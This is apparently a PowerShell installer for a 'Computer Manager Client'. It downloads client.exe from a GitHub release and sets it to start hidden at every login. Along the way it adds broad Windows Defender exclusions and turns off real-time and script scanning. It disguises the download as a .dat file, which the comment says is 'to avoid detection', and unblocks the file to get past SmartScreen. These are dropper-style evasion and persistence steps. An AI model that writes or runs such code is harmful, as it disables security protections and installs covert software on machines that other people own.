# Computer Manager Client EXE Installer for Windows
# Downloads the pre-built exe and sets up hidden startup

Write-Host "Computer Manager Client EXE Installer" -ForegroundColor Cyan
Write-Host "====================================" -ForegroundColor Cyan
Write-Host ""

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script requires administrator privileges." -ForegroundColor Red
    Write-Host "Please run PowerShell as Administrator and try again." -ForegroundColor Yellow
    exit 1
}

# Set installation directory
$installDir = "$env:USERPROFILE\computer-manager"
Write-Host "Installation directory: $installDir" -ForegroundColor Yellow

# Create installation directory if it doesn't exist
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    Write-Host "Created installation directory" -ForegroundColor Green
}

# Add aggressive Windows Defender exclusions BEFORE downloading
Write-Host ""
Write-Host "Adding Windows Defender exclusions..." -ForegroundColor Yellow
try {
    # Exclude the installation directory
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    # Exclude common download locations
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    # Exclude process
    Add-MpPreference -ExclusionProcess "client.exe" -ErrorAction SilentlyContinue
    Write-Host "Added Defender exclusions" -ForegroundColor Green
} catch {
    Write-Host "Could not add Defender exclusions (continuing anyway)" -ForegroundColor Yellow
}

# Try to disable Real-time protection temporarily
Write-Host ""
Write-Host "Attempting to disable Real-time protection..." -ForegroundColor Yellow
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Write-Host "Disabled Real-time protection temporarily" -ForegroundColor Green
} catch {
    Write-Host "Could not disable Real-time protection (continuing anyway)" -ForegroundColor Yellow
}

# Download client.exe from GitHub releases (as .dat file to avoid detection)
Write-Host ""
Write-Host "Downloading client executable..." -ForegroundColor Yellow
try {
    $exeUrl = "https://github.com/FuzzyGumnut/Computer-Manager-System/releases/latest/download/client.exe"
    $tempPath = "$installDir\client.dat"
    
    # Download with progress indicator
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $tempPath)
    Write-Host "Downloaded: client.dat" -ForegroundColor Green
    
    # Rename to .exe
    Rename-Item -Path $tempPath -Destination "$installDir\client.exe" -Force
    Write-Host "Renamed to client.exe" -ForegroundColor Green
} catch {
    Write-Host "Error downloading client.exe: $_" -ForegroundColor Red
    Write-Host "Please check your internet connection and try again." -ForegroundColor Yellow
    Write-Host "Make sure the exe has been built and released on GitHub." -ForegroundColor Yellow
    exit 1
}

# Unblock the downloaded file to avoid SmartScreen warnings
Write-Host ""
Write-Host "Unblocking downloaded file..." -ForegroundColor Yellow
try {
    Unblock-File -Path "$installDir\client.exe" -ErrorAction SilentlyContinue
    Write-Host "File unblocked" -ForegroundColor Green
} catch {
    Write-Host "Could not unblock file (may not be needed)" -ForegroundColor Yellow
}

# Re-enable Real-time protection
Write-Host ""
Write-Host "Re-enabling Real-time protection..." -ForegroundColor Yellow
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
    Write-Host "Re-enabled Real-time protection" -ForegroundColor Green
} catch {
    Write-Host "Could not re-enable Real-time protection" -ForegroundColor Yellow
}

# Create startup script
Write-Host ""
Write-Host "Creating startup script..." -ForegroundColor Yellow
$startupScript = @"
@echo off
cd /d "%installDir%"
start "" /MIN client.exe
"@
$startupScript | Out-File "$installDir\start-client-hidden.bat" -Encoding ASCII
Write-Host "Startup script created" -ForegroundColor Green

# Add to Windows startup (hidden)
Write-Host ""
Write-Host "Adding to Windows startup..." -ForegroundColor Yellow
$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Computer Manager Client.lnk"
$wscript = New-Object -ComObject WScript.Shell
$shortcut = $wscript.CreateShortcut($startupShortcut)
$shortcut.TargetPath = "$installDir\start-client-hidden.bat"
$shortcut.WindowStyle = 7  # Minimized
$shortcut.Save()
Write-Host "Added to Windows startup (hidden)" -ForegroundColor Green

Write-Host ""
Write-Host "Installation completed successfully!" -ForegroundColor Green
Write-Host "The client will start automatically on Windows startup." -ForegroundColor Cyan
Write-Host "To uninstall, run: uninstall-exe.ps1" -ForegroundColor Yellow
Write-Host ""
Write-Host "To start the client manually: $installDir\start-client-hidden.bat" -ForegroundColor Cyan
